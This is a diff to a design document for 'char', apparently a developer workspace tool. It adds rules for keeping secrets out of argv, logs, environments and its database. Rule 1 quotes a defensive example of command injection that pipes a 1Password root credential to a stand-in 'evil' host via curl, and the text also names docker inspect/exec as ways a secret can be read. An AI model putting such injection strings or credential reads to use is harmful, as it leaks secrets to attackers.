@@ -997,10 +997,43 @@ Providers still do their own session caching — `op` already does, and that rem
 their problem rather than char's.
 
 **What this does and does not guarantee.** char guarantees the secret is never in `char.yml`,
-never in argv, never in char's own logs or `--json`, and never retrievable through any char
-verb. char *cannot* stop an agent from running `op read` itself, cannot control a command
-invoked outside char, and cannot defeat deliberate exfiltration through encoding. Scrubbing
-is defense-in-depth, not a proof.
+never in argv, never in char's own logs, `--json` or database, and never retrievable through
+any char verb. char *cannot* stop an agent from running `op read` itself, cannot control a
+command invoked outside char, and cannot defeat deliberate exfiltration through encoding.
+Scrubbing is defense-in-depth, not a proof.
+
+**And it cannot protect a secret from whatever it hands the secret to.** A grant to a
+`driver: compose` service is **visible to anyone who can reach the Docker daemon** — measured:
+`docker inspect --format '{{json .Config.Env}}'` returns it in cleartext. That is Docker's
+trust model, not a charkit defect, and it is not fixable by char: even mounting the value as a
+compose secret leaves it readable via `docker exec ... cat /run/secrets/<name>`. Daemon access
+is root-equivalent to every container. Anyone running char already trusts Docker with the
+workload; stating this plainly is worth more than machinery that moves the exposure without
+closing it.
+
+#### Five rules that are genuinely char's to enforce
+
+1. **`${ref}` is passed as a single argv element, never through a shell.** A provider `cmd` is
+   argv-split and the reference substituted into one slot. Otherwise
+   `secrets: {X: "op://a; curl evil/$(op read op://Private/AWS/root)"}` is command injection
+   that reads as an inert URI in review.
+2. **Scrubbing happens at the value level, before serialization.** Filtering the serialized
+   output fails the moment a value contains `"`, `\` or a non-ASCII byte, because the
+   serializer escapes it first — char's own encoder defeating char's own filter.
+3. **Provider failure output is never surfaced verbatim.** When a provider fails there is no
+   resolved value registered to scrub against, so a chatty provider — `set -x`, `--debug` —
+   leaks through a path structurally incapable of redaction. Report the provider name, its
+   exit code, and a fixed message.
+4. **`owns.release:` records a *reference*, resolved at `clean` time — never a resolved
+   value.** §6.1's whole point is that the command survives the workspace directory; recording
+   the credential inline would put a plaintext secret in `char.db` permanently. `owns:`
+   therefore takes a `secrets:` grant like any other entry.
+5. **The detach handoff must not use char's own environment.** §4.7 resolves before detaching,
+   and §4.5 inherits the parent environment wholesale to every child — so putting resolved
+   values in char's own env would silently grant every secret to every child and void
+   per-entry grants entirely. Pass them to the detached process over an inherited pipe closed
+   after read. A test must assert that a check with **no** grant sees no secret in its
+   environment during a run where a sibling check has one.
 
 The win is narrower than "foolproof" and still large: **the default path becomes safe.** The
 agent runs `char up`, the service gets its token, and nothing the agent can read ever
@@ -1140,8 +1173,10 @@ resolved secret is never written to `.char/` — would be violated by constructi
 Piping to `-f -` is verified to accept the document and produce identical resolved output.
 
 **The inspectable artifact is recovered explicitly**, not by default: `char up --dump-compose`
-writes the document for debugging and warns that it may contain resolved values. An explicit
-act with a warning is a different risk from a file that always exists.
+writes the document for debugging, **with every `environment:` and `env_file:` value replaced
+by `<redacted>`**. The flag exists to inspect the port and label transform, which is the only
+thing it is actually for — dumping the values would be `char secret get` spelled differently,
+and it is exactly the flag an error message would suggest to a stuck agent.
 
 **Ownership falls out.** Containers and networks carry `com.docker.compose.project=char-<id>`
 (compose applies it automatically from `-p`) plus the two char labels from the transform —
@@ -1239,6 +1274,7 @@ components:
     setup: [bundle install, rails db:create, rails db:migrate]
     owns:
       files: [node_modules, .venv]
+      secrets: [DB_ADMIN]        # granted to release:, resolved at clean time
       release: psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
 ```
 
@@ -1262,8 +1298,15 @@ from anywhere:
 ```
 declared   psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
 recorded   psql -h db.internal -c 'DROP DATABASE app_a3f91c02'
-run by     char clean, and char clean --orphaned, with no workspace present
+           + the secret *references* it was granted - never their values
+run by     char clean and char clean --orphaned, with no workspace present,
+           resolving those references at that moment
 ```
+
+**Only the command and the references are recorded.** Recording a resolved credential would
+put a plaintext secret in `char.db` permanently, surviving `clean` by design — which is why
+§1.8's invariant now names that database explicitly. `owns:` takes a `secrets:` grant like any
+other entry, and `clean` resolves it when it runs.
 
 **`files:` are removed only by `char clean --artifacts`, never by plain `clean`.** They cost
 disk but leak nothing machine-global, and deleting them means the next `init` pays a full
